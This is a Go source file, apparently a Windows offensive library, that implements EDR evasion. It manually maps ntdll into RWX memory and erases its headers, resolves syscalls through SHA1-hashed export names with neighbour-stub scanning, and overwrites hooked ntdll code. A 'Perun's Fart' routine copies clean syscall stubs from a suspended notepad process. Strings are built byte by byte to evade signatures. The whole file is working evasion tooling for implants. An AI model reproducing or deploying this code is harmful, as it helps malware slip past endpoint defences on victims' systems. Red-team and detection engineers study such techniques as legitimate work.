package gabh

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/awgh/rawreader"
	"golang.org/x/sys/windows"
)

func (l *Library) UniversalFindProc(funcname string) (uintptr, error) {
	v, ok := l.Exports[strings.ToLower(funcname)]
	if !ok {
		return 0, errors.New("Call did not find export " + funcname)
	}
	return l.BaseAddress + uintptr(v), nil
}

// FindProc - returns the address of the given function in this library
func (l *Library) FindProc(funcname string) (uintptr, bool) {
	v, ok := l.Exports[funcname]
	return l.BaseAddress + uintptr(v), ok
}

func Universal(hash func(string) string) (*Library, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) + string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	image, err := ioutil.ReadFile(l)
	if err != nil {
		return nil, err
	}
	library, err := LoadLibraryImpl(&image, hash)
	if err != nil {
		return nil, err
	}
	library.Name = string([]byte{'n', 't', 'd', 'l', 'l'})
	return library, nil
}


func Memset(ptr uintptr, c byte, n uintptr) {
	var i uintptr
	for i = 0; i < n; i++ {
		pByte := (*byte)(unsafe.Pointer(ptr + i))
		*pByte = c
	}
}


// LoadLibraryImpl - loads a single library to memory, without trying to check or load required imports
func LoadLibraryImpl(image *[]byte, hash func(string) string) (*Library, error) {
	const PtrSize = 32 << uintptr(^uintptr(0)>>63) // are we on a 32bit or 64bit system?
	pelib, err := pe.NewFile(bytes.NewReader(*image))
	if err != nil {
		return nil, err
	}
	pe64 := pelib.Machine == pe.IMAGE_FILE_MACHINE_AMD64
	if pe64 && PtrSize != 64 {
		return nil, errors.New("Cannot load a 64bit DLL from a 32bit process")
	} else if !pe64 && PtrSize != 32 {
		return nil, errors.New("Cannot load a 32bit DLL from a 64bit process")
	}

	var sizeOfImage uintptr
	if pe64 {
		sizeOfImage = uintptr(pelib.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage)
	} else {
		sizeOfImage = uintptr(pelib.OptionalHeader.(*pe.OptionalHeader32).SizeOfImage)
	}

	r, err := NvA(0, sizeOfImage, MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return nil, err
	}
	dst, err := NvA(r, sizeOfImage, MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)

	if err != nil {
		return nil, err
	}

	//perform base relocations
	pelib.Relocate(uint64(dst), image)

	//write to memory
	copySections(pelib, image, dst)

	Memset(dst, byte(0), unsafe.Sizeof(IMAGE_NT_HEADERS{})+unsafe.Sizeof(IMAGE_DOS_HEADER{}))

	exports, err := pelib.Exports()
	if err != nil {
		return nil, err
	}
	lib := Library{
		BaseAddress: dst,
		Exports:     make(map[string]uint64),
	}
	for _, x := range exports {
		lib.Exports[hash(x.Name)] = uint64(x.VirtualAddress)
		lib.Exports[hash(strings.ToLower(x.Name))] = uint64(x.VirtualAddress)
	}

	return &lib, nil
}


// CopySections - writes the sections of a PE image to the given base address in memory
func copySections(pefile *pe.File, image *[]byte, loc uintptr) error {
	// Copy Headers
	var sizeOfHeaders uint32
	if pefile.Machine == pe.IMAGE_FILE_MACHINE_AMD64 {
		sizeOfHeaders = pefile.OptionalHeader.(*pe.OptionalHeader64).SizeOfHeaders
	} else {
		sizeOfHeaders = pefile.OptionalHeader.(*pe.OptionalHeader32).SizeOfHeaders
	}
	hbuf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(loc)))
	for index := uint32(0); index < sizeOfHeaders; index++ {
		hbuf[index] = (*image)[index]
	}

	// Copy Sections
	for _, section := range pefile.Sections {
		//fmt.Println("Writing:", fmt.Sprintf("%s %x %x", section.Name, loc, uint32(loc)+section.VirtualAddress))
		if section.Size == 0 {
			continue
		}
		d, err := section.Data()
		if err != nil {
			return err
		}
		dataLen := uint32(len(d))
		dst := uint64(loc) + uint64(section.VirtualAddress)
		buf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(dst)))
		for index := uint32(0); index < dataLen; index++ {
			buf[index] = d[index]
		}
	}

	// Write symbol and string tables
	bbuf := bytes.NewBuffer(nil)
	binary.Write(bbuf, binary.LittleEndian, pefile.COFFSymbols)
	binary.Write(bbuf, binary.LittleEndian, pefile.StringTable)
	b := bbuf.Bytes()
	blen := uint32(len(b))
	for index := uint32(0); index < blen; index++ {
		hbuf[index+pefile.FileHeader.PointerToSymbolTable] = b[index]
	}

	return nil
}

//NtAllocateVirtualMemory
func NvA(addr , size uintptr, allocType, protect uint32) (uintptr, error) {
	procVA,_,e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),"04262a7943514ab931287729e862ca663d81f515",str2sha1)
	if procVA == 0{
		return 0,e
	}
	r,_,e :=syscall.Syscall6(uintptr(procVA),6,uintptr(0xffffffffffffffff),uintptr(unsafe.Pointer(&addr)),0,uintptr(unsafe.Pointer(&size)),uintptr(allocType),uintptr(protect))
	if r != 0{
		return 0,e
	}
	return addr, nil
}


func ReMapNtdll() (*unNtd, error) {
	var uNTD = &unNtd{}

	//ntcreatefile = ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5
	NCF_ptr, _, e := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5", str2sha1)
	if e != nil {
		fmt.Println(e)
		return uNTD, fmt.Errorf("NtCreateFile Err")
	}

	var hNtdllfile uintptr

	ntPathW := "\\??\\C:\\Windows\\System32\\" + string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	ntPath, _ := windows.NewNTUnicodeString(ntPathW)

	objectAttributes := windows.OBJECT_ATTRIBUTES{}
	objectAttributes.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
	objectAttributes.ObjectName = ntPath

	var ioStatusBlock windows.IO_STATUS_BLOCK

	//status = NtCreateFile(&handleNtdllDisk, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	syscall.Syscall12(uintptr(NCF_ptr), 11, uintptr(unsafe.Pointer(&hNtdllfile)), uintptr(0x80|syscall.GENERIC_READ|syscall.SYNCHRONIZE), uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&ioStatusBlock)), 0, 0, syscall.FILE_SHARE_READ, uintptr(0x00000001), uintptr(0x00000040|0x00000020), 0, 0, 0)

	//ntcreatesection = 747d342b80e4c1c9d4d3dcb4ee2da24dcce27801
	NCS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "747d342b80e4c1c9d4d3dcb4ee2da24dcce27801", str2sha1)

	var handleNtdllSection uintptr
	//status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
	syscall.Syscall9(uintptr(NCS_ptr), 7, uintptr(unsafe.Pointer(&handleNtdllSection)), uintptr(0x000F0000|0x4|0x1), 0, 0, syscall.PAGE_READONLY, uintptr(0x1000000), hNtdllfile, 0, 0)

	//zwmapviewofsection = da39da04447a22b747ac8e86b4773bbd6ea96f9b
	ZMVS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "da39da04447a22b747ac8e86b4773bbd6ea96f9b", str2sha1)

	var unhookedBaseAddress uintptr
	var size uintptr
	//status = NtMapViewOfSection(handleNtdllSection, NtCurrentProcess(), &unhookedNtdllBaseAddress, 0, 0, 0, &size, ViewShare, 0, PAGE_READONLY);
	syscall.Syscall12(uintptr(ZMVS_ptr), 10, handleNtdllSection, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&unhookedBaseAddress)), 0, 0, 0, uintptr(unsafe.Pointer(&size)), 1, 0, syscall.PAGE_READONLY, 0, 0)

	uNTD.pModule = unhookedBaseAddress
	uNTD.size = size
	return uNTD, nil

}

//returns a pointer to the function (Virtual Address)
func (u *unNtd) GetFuncUnhook(funcnamehash string, hash func(string) string) (uint64, string, error) {
	rr := rawreader.New(u.pModule, int(u.size))
	p, e := pe.NewFileFromMemory(rr)
	if e != nil {
		return 0, "", e
	}

	ex, e := p.Exports()
	if e != nil {
		return 0, "", e
	}

	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
			return uint64(u.pModule) + uint64(exp.VirtualAddress), exp.Name, nil
		}
	}
	return 0, "", fmt.Errorf("could not find function!!! ")
}

func dllExports(dllname string) (*pe.File, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) + dllname
	p, e := pe.Open(l)
	if e != nil {
		return nil, e
	}
	return p, nil
}

//import from Memory
func dllMemExports(dllname string) (*pe.File, error) {
	r1,r2 := inMemLoads(dllname)
	rr := rawreader.New(r1, int(r2))
	p, e := pe.NewFileFromMemory(rr)
	if e != nil {
		return nil, e
	}
	return p, nil
}


//GetModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func gMLO(i int) (start uintptr, size uintptr, modulepath string) {
	var badstring *sstring
	start, size, badstring = getMLO(i)
	modulepath = badstring.String()
	return
}


//InMemLoads returns a map of loaded dll paths to current process offsets (aka images) in the current process. No syscalls are made.
func inMemLoads(modulename string) (uintptr,uintptr) {
	s, si, p := gMLO(0)
	start := p
	i := 1
	if strings.Contains(strings.ToLower(p),strings.ToLower(modulename)){
		return s,si
	}
	for {
		s, si, p = gMLO(i)
		if p != "" {
			if strings.Contains(strings.ToLower(p),strings.ToLower(modulename)){
				return s,si
			}
		}
		if p == start {
			break
		}
		i++
	}
	return 0,0
}

//MemFuncPtr returns a pointer to the function (Virtual Address)
func MemFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
	//Get dll module BaseAddr
	phModule,_ := inMemLoads(moduleName)

	if phModule == 0 {
		syscall.LoadLibrary(moduleName)
		phModule,_ = inMemLoads(moduleName)
		if  phModule == 0 {
			return 0, "", fmt.Errorf("Can't Load %s"+moduleName)
		}
	}
	//get dll exports
	pef, err := dllMemExports(moduleName)
	if err != nil {
		return 0, "", err
	}
	ex, err := pef.Exports()
	if err != nil {
		return 0, "", err
	}

	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
			return uint64(phModule) + uint64(exp.VirtualAddress), exp.Name, nil
		}
	}
	return 0, "", fmt.Errorf("could not find function!!! ")
}



//DiskFuncPtr returns a pointer to the function (Virtual Address)
func DiskFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
	//Get dll module BaseAddr
	phModule,_ := inMemLoads(moduleName)

	if phModule == 0 {
		syscall.LoadLibrary(moduleName)
		phModule,_ = inMemLoads(moduleName)
		if  phModule == 0 {
			return 0, "", fmt.Errorf("Can't Load %s"+moduleName)
		}
	}
	//get dll exports
	pef, err := dllExports(moduleName)
	if err != nil {
		return 0, "", err
	}
	ex, err := pef.Exports()
	if err != nil {
		return 0, "", err
	}

	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
			return uint64(phModule) + uint64(exp.VirtualAddress), exp.Name, nil
		}
	}
	return 0, "", fmt.Errorf("could not find function!!! ")
}

//NtdllHgate takes the exported syscall name and gets the ID it refers to. This function will access the ntdll file _on disk_, and relevant events/logs will be generated for those actions.
func DiskHgate(funcname string, hash func(string) string) (uint16, error) {
	return getSysIDFromDisk(funcname, hash)
}

//NtdllHgate takes the exported syscall name and gets the ID it refers to. This function will access the ntdll file _on disk_, and relevant events/logs will be generated for those actions.
func MemHgate(funcname string, hash func(string) string) (uint16, error) {
	return getSysIDFromMem(funcname, hash)
}


//getSysIDFromMemory takes values to resolve, and resolves from disk.
func getSysIDFromMem(funcname string, hash func(string) string) (uint16, error) {
	//Get dll module BaseAddr
	//get ntdll handler
	Ntd, _,_ := gMLO(1)
	if Ntd == 0 {
		return 0,fmt.Errorf("err GetModuleHandleA")
	}
	//moduleInfo := windows.ModuleInfo{}
	//err := windows.GetModuleInformation(windows.Handle(uintptr(0xffffffffffffffff)), windows.Handle(Ntd), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))

	//if err != nil {
	//	return 0, err
	//}
	//addrMod := moduleInfo.BaseOfDll
	addrMod := Ntd

	//get ntheader of ntdll
	ntHeader := ntH(addrMod)
	if ntHeader == nil {
		return 0,fmt.Errorf("get ntHeader err")
	}
	windows.SleepEx(50, false)
	//get module size of ntdll
	modSize := ntHeader.OptionalHeader.SizeOfImage
	if modSize == 0 {
		return 0,fmt.Errorf("get module size err")
	}
	//fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))

	rr := rawreader.New(addrMod, int(modSize))
	p, e := pe.NewFileFromMemory(rr)

	if e != nil {
			return 0, e
	}
	ex, e := p.Exports()
	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcname) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcname) {
			offset := rvaToOffset(p, exp.VirtualAddress)
			b, e := p.Bytes()
			if e != nil {
				return 0, e
			}
			buff := b[offset : offset+10]

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if buff[0] == 0x4c &&
				buff[1] == 0x8b &&
				buff[2] == 0xd1 &&
				buff[3] == 0xb8 &&
				buff[6] == 0x00 &&
				buff[7] == 0x00 {
				return sysIDFromRawBytes(buff)
			}else {
				for idx := uintptr(1); idx <= 500; idx++ {
					// check neighboring syscall down
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) + idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) + idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) + idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) + idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) + idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) + idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) + idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) + idx*IDX))
						return Uint16Down(buff[4:8], uint16(idx)), nil
					}

					// check neighboring syscall up
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) - idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) - idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) - idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) - idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) - idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) - idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) - idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) - idx*IDX))
						return Uint16Up(buff[4:8], uint16(idx)), nil
					}
				}
			}

			return 0, errors.New("Could not find sID")
		}
	}
	return 0, errors.New("Could not find sID")
}


//getSysIDFromMemory takes values to resolve, and resolves from disk.
func getSysIDFromDisk(funcname string, hash func(string) string) (uint16, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	p, e := pe.Open(l)
	if e != nil {
		return 0, e
	}
	ex, e := p.Exports()
	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcname) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcname) {
			offset := rvaToOffset(p, exp.VirtualAddress)
			b, e := p.Bytes()
			if e != nil {
				return 0, e
			}
			buff := b[offset : offset+10]

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if buff[0] == 0x4c &&
				buff[1] == 0x8b &&
				buff[2] == 0xd1 &&
				buff[3] == 0xb8 &&
				buff[6] == 0x00 &&
				buff[7] == 0x00 {
				return sysIDFromRawBytes(buff)
			}else {
				for idx := uintptr(1); idx <= 500; idx++ {
					// check neighboring syscall down
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) + idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) + idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) + idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) + idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) + idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) + idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) + idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) + idx*IDX))
						return Uint16Down(buff[4:8], uint16(idx)), nil
					}

					// check neighboring syscall up
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) - idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) - idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) - idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) - idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) - idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) - idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) - idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) - idx*IDX))
						return Uint16Up(buff[4:8], uint16(idx)), nil
					}
				}
			}
			return 0, errors.New("Could not find sID")
		}
	}
	return 0, errors.New("Could not find sID")
}


//rvaToOffset converts an RVA value from a PE file into the file offset. When using binject/debug, this should work fine even with in-memory files.
func rvaToOffset(pefile *pe.File, rva uint32) uint32 {
	for _, hdr := range pefile.Sections {
		baseoffset := uint64(rva)
		if baseoffset > uint64(hdr.VirtualAddress) &&
			baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
			return rva - hdr.VirtualAddress + hdr.Offset
		}
	}
	return rva
}

//sysIDFromRawBytes takes a byte slice and determines if there is a sysID in the expected location. Returns a MayBeHookedError if the signature does not match.
func sysIDFromRawBytes(b []byte) (uint16, error) {
	return binary.LittleEndian.Uint16(b[4:8]), nil
}

func Uint16Down(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) - idx | uint16(b[1])<<8
}
func Uint16Up(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) + idx | uint16(b[1])<<8
}

//HgSyscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
func HgSyscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
	errcode = hgSyscall(callid, argh...)

	if errcode != 0 {
		err = fmt.Errorf("non-zero return from syscall")
	}
	return errcode, err
}

func FullUnhook(DLLname []string) error {
	for _, d := range DLLname {
		dll, err := ioutil.ReadFile(d)
		if err != nil {
			return err
		}
		file, error1 := pe.Open(d)
		if error1 != nil {
			return error1
		}
		x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
		bytes := dll[x.Offset:x.Size]
		loaddll, error2 := windows.LoadDLL(d)
		if error2 != nil {
			return error2
		}
		handle := loaddll.Handle
		dllBase := uintptr(handle)
		dllOffset := uint(dllBase) + uint(x.VirtualAddress)
		var oldfartcodeperms uintptr
		regionsize := uintptr(len(bytes))
		handlez := uintptr(0xffffffffffffffff)
		runfunc := npvm(
			handlez,
			(*uintptr)(unsafe.Pointer(&dllOffset)),
			&regionsize,
			syscall.PAGE_EXECUTE_READWRITE,
			&oldfartcodeperms,
		)
		if runfunc != 0 {
			panic(runfunc)
		}

		for i := 0; i < len(bytes); i++ {
			loc := uintptr(dllOffset + uint(i))
			mem := (*[1]byte)(unsafe.Pointer(loc))
			(*mem)[0] = bytes[i]
		}

		runfunc= npvm(
			handlez,
			(*uintptr)(unsafe.Pointer(&dllOffset)),
			&regionsize,
			oldfartcodeperms,
			&oldfartcodeperms,
		)
		if runfunc != 0 {
			panic(runfunc)
		}
	}
	return nil
}

func npvm(processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) uint32 {
	//NtProtectVirtualMemory
	sysid,_ := DiskHgate("646bd5afa7b482fdd90fb8f2eefe1301a867d7b9",str2sha1)
	if sysid == 0{
		return 0
	}
	errcode := hgSyscall(
		sysid,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)

	return errcode
}


//Perun's Fart unhook function
//todo: change syscall package into gabh
func PerunsFart() error {

	//create suspended new process
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))

	target := "C:\\Windows\\System32\\notepad.exe"
	//target := os.args[0]

	cmdline, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(
		nil,
		cmdline,
		nil,
		nil,
		false,
		windows.CREATE_NEW_CONSOLE|windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		return err
	}

	fmt.Println("Start Suspended Notepad.exe and Sleep 1s pid: " + strconv.Itoa(int(pi.ProcessId)))

	windows.SleepEx(1000, false)

	//get ntdll handler
	//GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
	//bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	//Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
	//if Ntdll == 0 {
	//	return fmt.Errorf("err GetModuleHandleA")
	//}
	Ntd, _,_ := gMLO(1)

	//moduleInfo := windows.ModuleInfo{}

	//curr, _ := syscall.GetCurrentProcess()
	//if curr == 0 {
	//	return fmt.Errorf("err GetCurrentProcess")
	//}

	//err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
	//if err != nil {
	//	return err
	//}

	addrMod := Ntd

	//get ntheader of ntdll
	ntHeader := ntH(addrMod)
	if ntHeader == nil {
		return fmt.Errorf("get ntHeader err")
	}
	fmt.Printf("ModuleBase: 0x%x\n",addrMod)

	windows.SleepEx(50, false)

	//get module size of ntdll
	modSize := ntHeader.OptionalHeader.SizeOfImage
	if modSize == 0 {
		return fmt.Errorf("get module size err")
	}
	fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))

	cache := make([]byte, modSize)

	var lpNumberOfBytesRead uintptr

	//read clean ntdll from new process
	//todo: change readprocessmemory into Nt api
	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), &lpNumberOfBytesRead)
	if err != nil {
		return err
	}
	fmt.Printf("Read: %d\n",lpNumberOfBytesRead)

	e := syscall.TerminateProcess(pi.Process, 0)
	if e != nil {
		return e
	}

	fmt.Println("Terminate Suspended Process...")

	windows.SleepEx(50, false)

	fmt.Println("[+] Done ")

	pe0,_ := pe.NewFileFromMemory(bytes.NewReader(cache))

	//ntHdrs   := ntH(uintptr(unsafe.Pointer(&dll[0])))

	//fmt.Printf("+] Sections to enumerate is %d\n",ntHdrs.FileHeader.NumberOfSections)
	//pCurrentSection := uintptr(unsafe.Pointer(ntHdrs))+unsafe.Sizeof(IMAGE_NT_HEADERS{})

	SecHdr := pe0.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	//secHdr := (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
/*

	for i := 0; i < int(ntHdrs.FileHeader.NumberOfSections); i++{
		secHdr = (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
		if strings.Contains(secHdr.Name, ".text"){
			fmt.Printf("[+] .text section is at 0x%x\n",pCurrentSection)
			break
		}
		sizeOfSection := unsafe.Sizeof(pe.SectionHeader{})
		pCurrentSection += sizeOfSection
	}

 */

	fmt.Printf("Section VirtualSize: %d\n",SecHdr.VirtualSize)

	startOffset := findFirstSyscallOffset(cache,int(SecHdr.VirtualSize), addrMod)

	endOffset := findLastSyscallOffset(cache,int(SecHdr.VirtualSize), addrMod)

	cleanSyscalls := cache[startOffset:endOffset]

	var writenum uintptr
	//writeprocessmemory will set virtualProtect
	e =windows.WriteProcessMemory(0xffffffffffffffff,addrMod+uintptr(startOffset),&cleanSyscalls[0],uintptr(len(cleanSyscalls)),&writenum)
	if e != nil{
		return e
	}

	fmt.Printf("Write %d\n",writenum)

	/*
	var lpflOldProtect uint32
	e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),windows.PAGE_EXECUTE_READWRITE,&lpflOldProtect)
	if e != nil{
		return e
	}

	memcpy(addrMod+uintptr(startOffset),cleanSyscalls)

	e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),lpflOldProtect,&lpflOldProtect)
	if e != nil{
		return e
	}

	 */

	return nil

}

func findFirstSyscallOffset(pMem []byte,size int,moduleAddress uintptr) int {
	offset := 0
	pattern1 := []byte{ 0x0f, 0x05, 0xc3 }
	pattern2 := []byte{ 0xcc, 0xcc, 0xcc }

	// find first occurance of syscall+ret instructions
	for i:=0; i < size - 3; i++{
		instructions := []byte{pMem[i], pMem[i + 1], pMem[i + 2]}

		if instructions[0] == pattern1[0] && instructions[1] == pattern1[1] && instructions[2] == pattern1[2]{
			offset = i
			break
		}
	}


	// find the beginning of the syscall
	for i := 3; i < 50; i++{
		instructions := []byte{ pMem[offset - i], pMem[offset - i + 1], pMem[offset - i + 2] }
		if instructions[0] == pattern2[0] && instructions[1] == pattern2[1] && instructions[2] == pattern2[2]{
			offset = offset - i + 3
			break
		}
	}

	addr := moduleAddress+uintptr(offset)

	fmt.Printf("[+] First syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)

	return offset
}


func findLastSyscallOffset(pMem []byte,size int,moduleAddress uintptr) int {

	offset := 0
	pattern := []byte{ 0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc }

	for i := size - 9; i > 0; i--{
		instructions := []byte{ pMem[i], pMem[i + 1], pMem[i + 2], pMem[i + 3], pMem[i + 4], pMem[i + 5], pMem[i + 6], pMem[i + 7], pMem[i + 8] }

		if instructions[0] == pattern[0] && instructions[1] == pattern[1] && instructions[2] == pattern[2]{
			offset = i + 6
			break
		}
	}

	addr := moduleAddress + uintptr(offset)

	fmt.Printf("[+] Last syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)

	return offset
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}


func ntH(baseAddress uintptr) *IMAGE_NT_HEADERS {
	return (*IMAGE_NT_HEADERS)(unsafe.Pointer(baseAddress + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddress)).E_lfanew)))
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

//sstring is the stupid internal windows definiton of a unicode string. I hate it.
type sstring struct {
	Length    uint16
	MaxLength uint16
	PWstr     *uint16
}

func (s sstring) String() string {
	return windows.UTF16PtrToString(s.PWstr)
}


//Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
